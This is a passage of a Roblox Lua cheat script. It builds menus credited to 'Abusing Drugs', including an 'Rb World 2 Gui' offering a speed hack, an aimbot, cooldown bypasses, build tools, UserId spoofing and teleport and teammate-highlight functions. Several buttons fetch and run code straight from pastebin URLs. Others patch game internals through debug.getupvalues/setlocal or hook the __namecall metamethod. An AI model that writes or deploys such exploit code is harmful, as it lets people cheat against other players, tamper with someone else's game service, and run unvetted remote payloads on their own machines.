z.MouseButton1Click:connect(function()
	local a=game.Players.LocalPlayer 
	local a=a.Character 
	local e=a.HumanoidRootPart 
	local b=game.Workspace.OMEGALUL.Position 
	local d=false 
	local a=b-e.Position 
	local c=a.magnitude 
	local b=CFrame.new(e.Position,b).lookVector 
	local function a()
	if d then 
		return 
	end 
	d=true 
	for a=0,c,Q do 
		e.Anchored=false 
		e.CFrame=e.CFrame+(b*Q)
		wait((k/c)*Q)
		end
		d=false 
		e.Anchored=true 
	end 
	a()
	e.Anchored=false 
end)
x.MouseButton1Click:connect(function()
	for a=1,125 do 
		wait()
		local a=game.Players.LocalPlayer 
		local b=a.Character 
		local a=b.HumanoidRootPart 
		a.Anchored=false 
		a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+5,b.HumanoidRootPart.CFrame.z)
		a.Anchored=true 
	end 
	local a=game.Players.LocalPlayer 
	local a=a.Character 
	local a=a.HumanoidRootPart 
	a.Anchored=false 
end)
w.MouseButton1Click:connect(function()
	local a=game.Players.LocalPlayer 
	local b=a.Character 
	local a=b.HumanoidRootPart 
	a.Anchored=true 
	a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+35,b.HumanoidRootPart.CFrame.z)
	a.Anchored=false 
end)
local a=false 
E.MouseButton1Click:connect(function()
	if a==false then 
		a=true 
		E.BackgroundColor3=Color3.fromRGB(0,0,0)
		E.BackgroundTransparency=0.3 
		local b=game.Players.LocalPlayer 
		function e(a)
			for a,b in pairs(a:children())do 
			if b:IsA'BasePart'and b.Name~='HumanoidRootPart'then 
				local a=Instance.new('BoxHandleAdornment',b)
				a.Adornee=b 
				a.Size=b.Name=='Head'and Vector3.new(1.25,1.25,1.25)or b.Size a.Color3=b.Name=='Head'and Color3.new(0,1,0)or b.Name=='Torso'and Color3.new(0,1,0)or Color3.new(0,1,0)
				a.Transparency=.5 
				a.ZIndex=1 
				a.AlwaysOnTop=true
			end 
			if#b:children()>0  then 
				e(b)
			end 
		end 
	end 
	function g(a)
		for a,a in pairs(a:children()) do 
			if a:IsA'BasePart'and a:findFirstChild'BoxHandleAdornment'then 
				a.BoxHandleAdornment:Destroy()
			end 
			if#a:children()>0 then 
				g(a)
			end 
		end 
	end 
	function d(c)
		repeat wait()until c.Character 
		if c.TeamColor==b.TeamColor then 
			e(c.Character)
		else 
			g(c.Character)
		end 
		if c~=b then 
		c.Changed:connect(function(a)
			if a=='TeamColor'then 
				if c.TeamColor==b.TeamColor then 
					g(c.Character)
					e(c.Character)
				else 
					g(c.Character)
				end 
			end 
		end)
	else 
		c.Changed:connect(function(a)
			if a=='TeamColor'then 
				wait(.5)
				for a,a in pairs(game.Players:GetPlayers())do 
					g(a)
					if a.TeamColor==b.TeamColor then 
						e(a.Character)
					end 
				end 
			end 
		end)
	end 
end 
for a,a in pairs(game.Players:GetPlayers())do 
	a.CharacterAdded:connect(function()
		d(a)
	end)
	d(a)
end 
game.Players.PlayerAdded:connect(function(b)
	b.CharacterAdded:connect(function(a)
		d(b)
	end)
end)
	else
	end 
end)
v.MouseButton1Click:connect(function()
	local a=game.Players.LocalPlayer 
	local a=a.Character 
	local e=a.HumanoidRootPart 
	wait()
	local a=K.Text 
	if K.Text~=game.Players.LocalPlayer.Name then 
		local a=game.Workspace:findFirstChild(a).HumanoidRootPart 
		local b=a.Position 
		local d=false 
		local a=b-e.Position 
		local c=a.magnitude
		local b=CFrame.new(e.Position,b).lookVector 
		local function a()
		if d then 
			return 
		end 
		d=true 
		for a=0,c,Q do 
			e.Anchored=false 
			e.CFrame=e.CFrame+(b*Q)
			wait((k/c)*Q)
		end 
		d=false 
		e.Anchored=true 
	end 
	a()
	e.Anchored=false 
	else 
		j.Visible=true 
		wait(1)
		j.Visible=false 
	end 
end)
local e=L 
local b=N 
local a=O 
function h(a,b,c)
	local a=a.BackgroundColor3 
	if b=='r'then 
		a=Color3.new(c,a.g,a.b)
	end 
	if b=='g'then
		a=Color3.new(a.r,c,a.b)
	end 
	if b=='b'then 
		a=Color3.new(a.r,a.g,c)
	end 
	return a 
end 
while true do 
	local d=({'r','g','b'})[math.random(3)]
	if e.BackgroundColor3[d]<=0 then 
		for c=0,255,1 do 
			e.BackgroundColor3=h(e,d,c/255)
			b.BackgroundColor3=h(e,d,c/255)
			a.BackgroundColor3=h(e,d,c/255)
			game:GetService("RunService").Stepped:Wait()
		end 
	else 
		for c=255,0,-1 do 
			e.BackgroundColor3=h(e,d,c/255)
			b.BackgroundColor3=h(e,d,c/255)
			a.BackgroundColor3=h(e,d,c/255)
			game:GetService("RunService").Stepped:Wait()
		end 
	end 
end
end)

RBBtn.MouseButton1Down:Connect(function()
-- Rb World 2 V2 Gui By: Abusing Drugs
local RbWorldV2WIP = Instance.new("ScreenGui")
local Page2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Spe = Instance.new("TextButton")
local Dribble = Instance.new("TextButton")
local Stat = Instance.new("TextButton")
local Steal = Instance.new("TextButton")
local Aimbot = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local Next = Instance.new("TextButton")
local Page1 = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")
local Speed = Instance.new("TextButton")
local SwitchParks = Instance.new("TextButton")
local Btools = Instance.new("TextButton")
local Slots = Instance.new("TextButton")
local TextLabel_4 = Instance.new("TextLabel")
local Last = Instance.new("TextButton")
local Anim = Instance.new("TextButton")
--Properties:
RbWorldV2WIP.Name = "Rb World V2 WIP"
RbWorldV2WIP.Parent = game.CoreGui

--Page 2

Page2.Name = "Page 2"
Page2.Parent = RbWorldV2WIP
Page2.Active = true
Page2.BackgroundColor3 = Color3.new(1, 1, 1)
Page2.BackgroundTransparency = 1
Page2.Position = UDim2.new(0.717246294, 0, 0.104591765, 0)
Page2.Selectable = true
Page2.Size = UDim2.new(0, 180, 0, 307)
Page2.Visible = false
Page2.Active = true
Page2.Draggable = true

TextLabel.Parent = Page2
TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel.Position = UDim2.new(-0.0632859692, 0, -0.00260299444, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "Rb World 2 Gui"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true

Spe.Name = "Spe"
Spe.Parent = Page2
Spe.BackgroundColor3 = Color3.new(1, 0, 0)
Spe.Position = UDim2.new(-0.00435066223, 0, 0.69137907, 0)
Spe.Size = UDim2.new(0, 180, 0, 35)
Spe.Font = Enum.Font.Highway
Spe.Text = "Speed Hack"
Spe.TextColor3 = Color3.new(1, 1, 1)
Spe.TextScaled = true
Spe.TextSize = 14
Spe.TextWrapped = true

Spe.MouseButton1Down:connect(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/P967H6fL'),true))()
end)

Dribble.Name = "Dribble"
Dribble.Parent = Page2
Dribble.BackgroundColor3 = Color3.new(1, 0, 0)
Dribble.Position = UDim2.new(-0.00166678429, 0, 0.437178105, 0)
Dribble.Size = UDim2.new(0, 180, 0, 35)
Dribble.Font = Enum.Font.Highway
Dribble.Text = "Dribble Speed"
Dribble.TextColor3 = Color3.new(1, 1, 1)
Dribble.TextScaled = true
Dribble.TextSize = 14
Dribble.TextWrapped = true

Dribble.MouseButton1Down:connect(function()
local reg = debug.getregistry or getreg or getregistry;
local axc = debug.getupvalues or getupvalues;

for i,v in next, reg() do
    if typeof(v) == 'function' then
        local s, ups = pcall(axc, v);
        if ups and ups.dribbling then
            local fuck = ups.dribbling;
            fuck.combospeed = 100;
            fuck.dribblefadespeed = 100;
            fuck.combowait = -tick();
        elseif ups and ups.currentspeed then
            debug.setupvalues(v, 'currentspeed', 109);
        end;
    end;
end;
end)

Stat.Name = "Stat"
Stat.Parent = Page2
Stat.BackgroundColor3 = Color3.new(1, 0, 0)
Stat.Position = UDim2.new(-0.000461816788, 0, 0.180939555, 0)
Stat.Size = UDim2.new(0, 180, 0, 35)
Stat.Font = Enum.Font.Highway
Stat.Text = "Temp Stat Change"
Stat.TextColor3 = Color3.new(1, 1, 1)
Stat.TextScaled = true
Stat.TextSize = 14
Stat.TextWrapped = true

Stat.MouseButton1Down:connect (function()
loadstring(game:HttpGet(('https://pastebin.com/raw/cJc5rUjT'),true))()
end)

Steal.Name = "Steal"
Steal.Parent = Page2
Steal.BackgroundColor3 = Color3.new(1, 0, 0)
Steal.Position = UDim2.new(-0.00330936909, 0, 0.309625745, 0)
Steal.Size = UDim2.new(0, 180, 0, 35)
Steal.Font = Enum.Font.Highway
Steal.Text = "Steal No Cooldown"
Steal.TextColor3 = Color3.new(1, 1, 1)
Steal.TextScaled = true
Steal.TextSize = 14
Steal.TextWrapped = true

Steal.MouseButton1Down:connect (function()
local mt = assert(getrawmetatable, 'getout')(game);
local index, namecall, newindex = mt.__index, mt.__namecall, mt.__newindex;
local write = (make_writeable or setreadonly); xpcall(function() write(mt, false); end, function(err) warn(err) end);

mt['__namecall'] = function(self, ...)
    local args = {...};
    local method = args[#args];

    if (method == 'FireServer') then
        if (tostring(self) == 'value') then
            local s = debug.getupvalues(2);
            if s and (type(s.stealdebounce) ~= 'nil') then
                debug.setupvalue(2, 'stealdebounce', function() end);
            elseif s and (type(s.isstealing) ~= 'nil') then
                debug.setupvalue(2, 'isstealing', function() end);
            end;
        end;
    end;
    return namecall(self, ...);
end;
end)

Aimbot.Name = "Aimbot"
Aimbot.Parent = Page2
Aimbot.BackgroundColor3 = Color3.new(1, 0, 0)
Aimbot.Position = UDim2.new(-0.00283670425, 0, 0.563430667, 0)
Aimbot.Size = UDim2.new(0, 180, 0, 35)
Aimbot.Font = Enum.Font.Highway
Aimbot.Text = "Aimbot"
Aimbot.TextColor3 = Color3.new(1, 1, 1)
Aimbot.TextScaled = true
Aimbot.TextSize = 14
Aimbot.TextWrapped = true

Aimbot.MouseButton1Down:connect (function()
if not debug.getlocals and debug.setlocal then assert(false, 'Buy Cerberus') end;
local get = debug.getlocals or getlocals;
local set = debug.setlocal or setlocal;

_G.acc = 100

getrenv().print = function(...)
    for a,b in next,get(2) do
        if tostring(a) or tostring(b) == "myaccuracy" then
            set(2, "myaccuracy", _G.acc);
        end;
    end;
end;
end)

TextLabel_2.Parent = Page2
TextLabel_2.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel_2.Position = UDim2.new(-0.0586288273, 0, 0.965823352, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = "Gui Made By: Abusing Drugs#8194"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true

Next.Name = "Next"
Next.Parent = Page2
Next.BackgroundColor3 = Color3.new(1, 0, 0)
Next.Position = UDim2.new(-0.00166669395, 0, 0.831314862, 0)
Next.Size = UDim2.new(0, 180, 0, 35)
Next.Font = Enum.Font.Highway
Next.Text = "Last Page"
Next.TextColor3 = Color3.new(1, 1, 1)
Next.TextScaled = true
Next.TextSize = 14
Next.TextWrapped = true

Next.MouseButton1Down:connect (function()
Page1.Visible = true
Page2.Visible = false
end)

--Page 1

Page1.Name = "Page 1"
Page1.Parent = RbWorldV2WIP
Page1.Active = true
Page1.BackgroundColor3 = Color3.new(1, 1, 1)
Page1.BackgroundTransparency = 1
Page1.Position = UDim2.new(0.221501589, 0, 0.107142776, 0)
Page1.Selectable = true
Page1.Size = UDim2.new(0, 180, 0, 307)
Page1.Active = true
Page1.Draggable = true

TextLabel_3.Parent = Page1
TextLabel_3.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel_3.Position = UDim2.new(-0.0632859692, 0, -0.00260299444, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.Cartoon
TextLabel_3.Text = "Rb World 2 Gui"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14
TextLabel_3.TextWrapped = true

Speed.Name = "Speed"
Speed.Parent = Page1
Speed.BackgroundColor3 = Color3.new(1, 0, 0)
Speed.Position = UDim2.new(-0.00435066223, 0, 0.69137907, 0)
Speed.Size = UDim2.new(0, 180, 0, 35)
Speed.Font = Enum.Font.Highway
Speed.Text = "Speed Hack"
Speed.TextColor3 = Color3.new(1, 1, 1)
Speed.TextScaled = true
Speed.TextSize = 14
Speed.TextWrapped = true

Speed.MouseButton1Down:connect(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/P967H6fL'),true))()
end)

SwitchParks.Name = "Switch Parks"
SwitchParks.Parent = Page1
SwitchParks.BackgroundColor3 = Color3.new(1, 0, 0)
SwitchParks.Position = UDim2.new(-0.00166678429, 0, 0.437178105, 0)
SwitchParks.Size = UDim2.new(0, 180, 0, 35)
SwitchParks.Font = Enum.Font.Highway
SwitchParks.Text = "Switch Park"
SwitchParks.TextColor3 = Color3.new(1, 1, 1)
SwitchParks.TextScaled = true
SwitchParks.TextSize = 14
SwitchParks.TextWrapped = true

SwitchParks.MouseButton1Down:connect (function()
game.ReplicatedStorage.places:FindFirstChild("RB Eastside Park").Value = 593223204
game.ReplicatedStorage.places:FindFirstChild("RB Westlake Park").Value = 591582661
end)

Btools.Name = "Btools"
Btools.Parent = Page1
Btools.BackgroundColor3 = Color3.new(1, 0, 0)
Btools.Position = UDim2.new(-0.000461816788, 0, 0.180939555, 0)
Btools.Size = UDim2.new(0, 180, 0, 35)
Btools.Font = Enum.Font.Highway
Btools.Text = "Btools"
Btools.TextColor3 = Color3.new(1, 1, 1)
Btools.TextScaled = true
Btools.TextSize = 14
Btools.TextWrapped = true

Btools.MouseButton1Down:connect (function()
for _,v in next, workspace:GetDescendants() do
    if v:IsA("BasePart") then
        v.Locked = false
    end
end

local bt = Instance.new("HopperBin",game:service("Players").LocalPlayer.Backpack)
bt.BinType = "Hammer"

end)

Slots.Name = "Slots"
Slots.Parent = Page1
Slots.BackgroundColor3 = Color3.new(1, 0, 0)
Slots.Position = UDim2.new(-0.00283670425, 0, 0.563430667, 0)
Slots.Size = UDim2.new(0, 180, 0, 35)
Slots.Font = Enum.Font.Highway
Slots.Text = "3 Slots"
Slots.TextColor3 = Color3.new(1, 1, 1)
Slots.TextScaled = true
Slots.TextSize = 14
Slots.TextWrapped = true

Slots.MouseButton1Down:connect (function()
game.Players.LocalPlayer.UserId = game.CreatorId;
end)

TextLabel_4.Parent = Page1
TextLabel_4.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel_4.Position = UDim2.new(-0.0586288273, 0, 0.965823352, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.Cartoon
TextLabel_4.Text = "Gui Made By: Abusing Drugs#8194"
TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14
TextLabel_4.TextWrapped = true

Last.Name = "Last"
Last.Parent = Page1
Last.BackgroundColor3 = Color3.new(1, 0, 0)
Last.Position = UDim2.new(-0.00166669395, 0, 0.831314862, 0)
Last.Size = UDim2.new(0, 180, 0, 35)
Last.Font = Enum.Font.Highway
Last.Text = "Next Page"
Last.TextColor3 = Color3.new(1, 1, 1)
Last.TextScaled = true
Last.TextSize = 14
Last.TextWrapped = true

Last.MouseButton1Down:connect (function()
Page1.Visible = false
Page2.Visible = true
end)

Anim.Name = "Anim"
Anim.Parent = Page1
Anim.BackgroundColor3 = Color3.new(1, 0, 0)
Anim.Position = UDim2.new(-0.00330936909, 0, 0.309625745, 0)
Anim.Size = UDim2.new(0, 180, 0, 35)
Anim.Font = Enum.Font.Highway
Anim.Text = "Animation Gui"
Anim.TextColor3 = Color3.new(1, 1, 1)
Anim.TextScaled = true
Anim.TextSize = 14
Anim.TextWrapped = true

Anim.MouseButton1Down:connect (function()
-- Animation Gui Made By Abusing Drugs
local AnimationGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local Shimmy = Instance.new("TextButton")
local Pray = Instance.new("TextButton")
local YouDed = Instance.new("TextButton")
local Whip = Instance.new("TextButton")
local Cookin = Instance.new("TextButton")
local Dab = Instance.new("TextButton")
local HTF = Instance.new("TextButton")
local SuperSayin = Instance.new("TextButton")
local Refreshed = Instance.new("TextButton")
local Hype = Instance.new("TextButton")
local Praise = Instance.new("TextButton")
local No = Instance.new("TextButton")
local ToTheSky = Instance.new("TextButton")
local Fall = Instance.new("TextButton")
local Smack = Instance.new("TextButton")
local Swish = Instance.new("TextButton")
local Trip = Instance.new("TextButton")
local Flick = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
--Properties:
AnimationGui.Name = "Animation Gui"
AnimationGui.Parent = game.CoreGui

Frame.Parent = AnimationGui
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.Position = UDim2.new(0.375391066, 0, 0.238071084, 0)
Frame.Size = UDim2.new(0, 180, 0, 362)
Frame.Active = true
Frame.Draggable = true

ScrollingFrame.Parent = Frame
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.Position = UDim2.new(-0.00230102544, 0, 0.136393934, 0)
ScrollingFrame.Size = UDim2.new(0, 180, 0, 312)
ScrollingFrame.HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar

Shimmy.Name = "Shimmy"
Shimmy.Parent = ScrollingFrame
Shimmy.BackgroundColor3 = Color3.new(1, 0, 0)
Shimmy.Size = UDim2.new(0, 168, 0, 35)
Shimmy.Font = Enum.Font.Highway
Shimmy.Text = "Shimmy"
Shimmy.TextColor3 = Color3.new(1, 1, 1)
Shimmy.TextScaled = true
Shimmy.TextSize = 14
Shimmy.TextWrapped = true

Shimmy.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "694777468"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Pray.Name = "Pray"
Pray.Parent = ScrollingFrame
Pray.BackgroundColor3 = Color3.new(1, 0, 0)
Pray.Position = UDim2.new(0, 0, 0.0481253676, 0)
Pray.Size = UDim2.new(0, 168, 0, 35)
Pray.Font = Enum.Font.Highway
Pray.Text = "Pray"
Pray.TextColor3 = Color3.new(1, 1, 1)
Pray.TextScaled = true
Pray.TextSize = 14
Pray.TextWrapped = true

Pray.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966905791"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

YouDed.Name = "YouDed"
YouDed.Parent = ScrollingFrame
YouDed.BackgroundColor3 = Color3.new(1, 0, 0)
YouDed.Position = UDim2.new(0, 0, 0.0962507352, 0)
YouDed.Size = UDim2.new(0, 168, 0, 35)
YouDed.Font = Enum.Font.Highway
YouDed.Text = "You Dead"
YouDed.TextColor3 = Color3.new(1, 1, 1)
YouDed.TextScaled = true
YouDed.TextSize = 14
YouDed.TextWrapped = true

YouDed.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966906954"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Whip.Name = "Whip"
Whip.Parent = ScrollingFrame
Whip.BackgroundColor3 = Color3.new(1, 0, 0)
Whip.Position = UDim2.new(0, 0, 0.144376114, 0)
Whip.Size = UDim2.new(0, 168, 0, 35)
Whip.Font = Enum.Font.Highway
Whip.Text = "Whip"
Whip.TextColor3 = Color3.new(1, 1, 1)
Whip.TextScaled = true
Whip.TextSize = 14
Whip.TextWrapped = true

Whip.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966907872"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Cookin.Name = "Cookin"
Cookin.Parent = ScrollingFrame
Cookin.BackgroundColor3 = Color3.new(1, 0, 0)
Cookin.Position = UDim2.new(0, 0, 0.19250147, 0)
Cookin.Size = UDim2.new(0, 168, 0, 35)
Cookin.Font = Enum.Font.Highway
Cookin.Text = "Cooking"
Cookin.TextColor3 = Color3.new(1, 1, 1)
Cookin.TextScaled = true
Cookin.TextSize = 14
Cookin.TextWrapped = true

Cookin.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966904248"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Dab.Name = "Dab"
Dab.Parent = ScrollingFrame
Dab.BackgroundColor3 = Color3.new(1, 0, 0)
Dab.Position = UDim2.new(0, 0, 0.240626857, 0)
Dab.Size = UDim2.new(0, 168, 0, 35)
Dab.Font = Enum.Font.Highway
Dab.Text = "Dab"
Dab.TextColor3 = Color3.new(1, 1, 1)
Dab.TextScaled = true
Dab.TextSize = 14
Dab.TextWrapped = true

Dab.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966904726"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

HTF.Name = "HTF"
HTF.Parent = ScrollingFrame
HTF.BackgroundColor3 = Color3.new(1, 0, 0)
HTF.Position = UDim2.new(0, 0, 0.288752228, 0)
HTF.Size = UDim2.new(0, 168, 0, 35)
HTF.Font = Enum.Font.Highway
HTF.Text = "HTF"
HTF.TextColor3 = Color3.new(1, 1, 1)
HTF.TextScaled = true
HTF.TextSize = 14
HTF.TextWrapped = true

HTF.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966908607"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

SuperSayin.Name = "Super Sayin"
SuperSayin.Parent = ScrollingFrame
SuperSayin.BackgroundColor3 = Color3.new(1, 0, 0)
SuperSayin.Position = UDim2.new(-3.7252903e-09, 0, 0.336877584, 0)
SuperSayin.Size = UDim2.new(0, 168, 0, 35)
SuperSayin.Font = Enum.Font.Highway
SuperSayin.Text = "Super Sayin"
SuperSayin.TextColor3 = Color3.new(1, 1, 1)
SuperSayin.TextScaled = true
SuperSayin.TextSize = 14
SuperSayin.TextWrapped = true

SuperSayin.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "955256993"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Refreshed.Name = "Refreshed"
Refreshed.Parent = ScrollingFrame
Refreshed.BackgroundColor3 = Color3.new(1, 0, 0)
Refreshed.Position = UDim2.new(0, 0, 0.385002941, 0)
Refreshed.Size = UDim2.new(0, 168, 0, 35)
Refreshed.Font = Enum.Font.Highway
Refreshed.Text = "Refreshed"
Refreshed.TextColor3 = Color3.new(1, 1, 1)
Refreshed.TextScaled = true
Refreshed.TextSize = 14
Refreshed.TextWrapped = true

Refreshed.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "937889143"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Hype.Name = "Hype"
Hype.Parent = ScrollingFrame
Hype.BackgroundColor3 = Color3.new(1, 0, 0)
Hype.Position = UDim2.new(0, 0, 0.433128297, 0)
Hype.Size = UDim2.new(0, 168, 0, 35)
Hype.Font = Enum.Font.Highway
Hype.Text = "Hype Crowd"
Hype.TextColor3 = Color3.new(1, 1, 1)
Hype.TextScaled = true
Hype.TextSize = 14
Hype.TextWrapped = true

Hype.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966907361"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Praise.Name = "Praise"
Praise.Parent = ScrollingFrame
Praise.BackgroundColor3 = Color3.new(1, 0, 0)
Praise.Position = UDim2.new(0, 0, 0.481253684, 0)
Praise.Size = UDim2.new(0, 168, 0, 35)
Praise.Font = Enum.Font.Highway
Praise.Text = "Praise"
Praise.TextColor3 = Color3.new(1, 1, 1)
Praise.TextScaled = true
Praise.TextSize = 14
Praise.TextWrapped = true

Praise.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966906445"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

No.Name = "No"
No.Parent = ScrollingFrame
No.BackgroundColor3 = Color3.new(1, 0, 0)
No.Position = UDim2.new(0, 0, 0.52937907, 0)
No.Size = UDim2.new(0, 168, 0, 35)
No.Font = Enum.Font.Highway
No.Text = "NoNo"
No.TextColor3 = Color3.new(1, 1, 1)
No.TextScaled = true
No.TextSize = 14
No.TextWrapped = true

No.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "966905413"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

ToTheSky.Name = "ToTheSky"
ToTheSky.Parent = ScrollingFrame
ToTheSky.BackgroundColor3 = Color3.new(1, 0, 0)
ToTheSky.Position = UDim2.new(0, 0, 0.577313364, 0)
ToTheSky.Size = UDim2.new(0, 168, 0, 35)
ToTheSky.Font = Enum.Font.Highway
ToTheSky.Text = "To The Sky"
ToTheSky.TextColor3 = Color3.new(1, 1, 1)
ToTheSky.TextScaled = true
ToTheSky.TextSize = 14
ToTheSky.TextWrapped = true

ToTheSky.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "851501443"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Fall.Name = "Fall"
Fall.Parent = ScrollingFrame
Fall.BackgroundColor3 = Color3.new(1, 0, 0)
Fall.Position = UDim2.new(0, 0, 0.62543869, 0)
Fall.Size = UDim2.new(0, 168, 0, 35)
Fall.Font = Enum.Font.Highway
Fall.Text = "Fall Back"
Fall.TextColor3 = Color3.new(1, 1, 1)
Fall.TextScaled = true
Fall.TextSize = 14
Fall.TextWrapped = true

Fall.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "846466371"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Smack.Name = "Smack"
Smack.Parent = ScrollingFrame
Smack.BackgroundColor3 = Color3.new(1, 0, 0)
Smack.Position = UDim2.new(0, 0, 0.673564076, 0)
Smack.Size = UDim2.new(0, 168, 0, 35)
Smack.Font = Enum.Font.Highway
Smack.Text = "Smack Cam"
Smack.TextColor3 = Color3.new(1, 1, 1)
Smack.TextScaled = true
Smack.TextSize = 14
Smack.TextWrapped = true

Smack.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "698479467"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Swish.Name = "Swish"
Swish.Parent = ScrollingFrame
Swish.BackgroundColor3 = Color3.new(1, 0, 0)
Swish.Position = UDim2.new(0, 0, 13.9714289, 0)
Swish.Size = UDim2.new(0, 168, 0, 35)
Swish.Font = Enum.Font.Highway
Swish.Text = "Swish"
Swish.TextColor3 = Color3.new(1, 1, 1)
Swish.TextScaled = true
Swish.TextSize = 14
Swish.TextWrapped = true

Swish.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "697234279"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
k:Play() --Play the animation
k:AdjustSpeed(1)
end)

Trip.Name = "Trip"
Trip.Parent = ScrollingFrame
Trip.BackgroundColor3 = Color3.new(1, 0, 0)
Trip.Position = UDim2.new(0, 0, 0.721689463, 0)
Trip.Size = UDim2.new(0, 168, 0, 35)
Trip.Font = Enum.Font.Highway
Trip.Text = "Trip back"
Trip.TextColor3 = Color3.new(1, 1, 1)
Trip.TextScaled = true
Trip.TextSize = 14
Trip.TextWrapped = true

Trip.MouseButton1Down:connect (function()
Player = "LocalPlayer"
AnimationId = "582247904"
local Anim = Instance.new("Animation")
